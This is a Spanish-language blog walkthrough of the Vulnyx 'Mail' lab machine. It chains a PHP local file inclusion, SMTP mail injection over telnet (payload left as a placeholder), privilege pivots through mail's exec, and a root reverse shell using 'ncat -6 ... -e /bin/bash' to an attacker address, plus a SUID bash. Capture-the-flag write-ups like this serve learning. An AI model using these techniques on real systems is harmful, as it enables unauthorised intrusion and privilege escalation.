---
layout: post
title:  "Mail: Vulnyx"
date:   2025-08-14
categories: [Vulnyx]
tags: [Vulnyx, PHP, LFI, SMTP, Mail Injection, Command Injection]
image: "../assets/machines/VULNYX/Vulnyx_Mail/vulnyx.png"
---
Esta maquina pertenece a Vulnyx, es de dificultad media y tiene uno que otro concepto interesante de vulnerabilidades programadas en PHP.

# Fase de reconocimiento
Bueno, esta maquina la estamos corriendo en **LOCAL**, si deseamos encontrar maquinas en toda nuestra red local, podemos emplear el comando:
{% highlight bash %}
sudo arp-scan -l
{% endhighlight %}
Iniciamos la <span class="color-text-salmon">**FASE DE RECONOCIMIENTO**</span>, usando nuestra herramienta de confianza:
{% highlight bash %}
nmap -T5 -n -Pn <IP>
{% endhighlight %}
Obteniendo como resultado los siguientes puertos abiertos:
- `22` del SSH.

- `25` del SMTP.

- `80` de un servicio WEB.

Si analizamos la web, encontraremos lo siguiente:

Si interactuamos con el **BOTON** "search", se nos hara redireccion a una funcion en <span class="color-text-blue">**PHP**</span>.

Si vamos buscando por distintos valores, vamos a encontrar correos de 2 usuarios: `abel` y `cain`. Ambos hablan sobre perdida de credenciales.
## LFI
Lo que nos importa es buscar si podemos hacer un cambio en el parametro que le pasamos a la funcion, para por ejemplo ver si podemos ejecutar comandos o listar directorios.

Como podemos ver, si apuntamos al `/etc/passwd`, tenemos un <span class="color-text-blue">**LFI**</span>(Local File Inclusion). Por lo que podemos intentar muchos vectores de ataque.

Si bien vimos que tenemos el puerto 25 del **TELNET**, podemos aprovecharnos de que podemos leer estos correos y extraer informacion como:

-`mail.nyx`

-`abel@mail.nyx` y `cain@mail.nyx`
## MAIL INJECTION
Si hacemos una busqueda rapida en internet, veremos que existen distintas instrucciones para lograr enviar un correo, y podemos usar la interpretacion de PHP por lado del servidor para ejecutar comandos, la estructura para lograr esto seria
{% highlight go %}
telnet <IP> 25
Trying <IP>...
Connected to <IP>
Escape character is '^]'.
220 mail.home ESMTP Postfix (Debian/GNU)
HELO mail.nyx
250 mail.home
MAIL FROM: cain@mail.nyx
250 2.1.0 Ok
RCPT TO: abel@mail.nyx
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<FUNCION MALICIOSA>
ESTO ES UN MENSAJE DE PRUEBA
.
250 2.0.0 Ok: queued as 8AC7E2AF
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
{% endhighlight %}

Si nos ha salido todo conforme, nos quedara apuntar a la ruta del que recibe el mensaje, en este caso `abel` -> `/var/mail/abel`

### USER CAIN
Y como podemos ver, tenemos <span class="color-text-orange">**ejecucion remota de comandos**</span>.

Por lo que nos queda ganar acceso a la maquina, usaremos **URL-ENCODE**.

Y como podemos ver, ya hemos ganado acceso al usuario `cain`, por los que nos toca pivotar al usuario `abel`.

Y vemos que podemos ejecutar como el usuario `abel`, el comando mail, y podremos aprovechar la funcion exec que tiene indicado en su documentacion.

### USER ABEL
Por lo que podemos tratar de summonearnos una bash.
Y como vemos, tenemos el acceso para el usuario `abel`, este a su vez tiene permisos de ejecutar como usuario `root` la herramienta `/usr/bin/ncat` usando IPv6 y cualquier parametro adicional.

### USER ROOT
Si vemos la documentacion que tiene `NCAT`, podemos ver que tambien nos puede ejecutar comandos.

Por lo que nos queda seguir la siguiente estructura:
- Necesitaremos obtener nuestra direccion IPv6, esta la encontraremos con el comando `ip a`

- Necesitamos el nombre o el alter-name de la red de la maquina, en este caso es `ens33` o su alter `enp2s1`
{% highlight python %}
# Para el listener
ncat -6 -lvp <PUERTO>
{% endhighlight %}

{% highlight python %}
# Para la shell
/usr/bin/ncat -6 <IPv6 del Atacante>%<Nombre de la red> -e /bin/bash
{% endhighlight %}

En este caso, yo estoy dandole permiso SUID a la bash, para poder ejecutar el privileged.

# FIN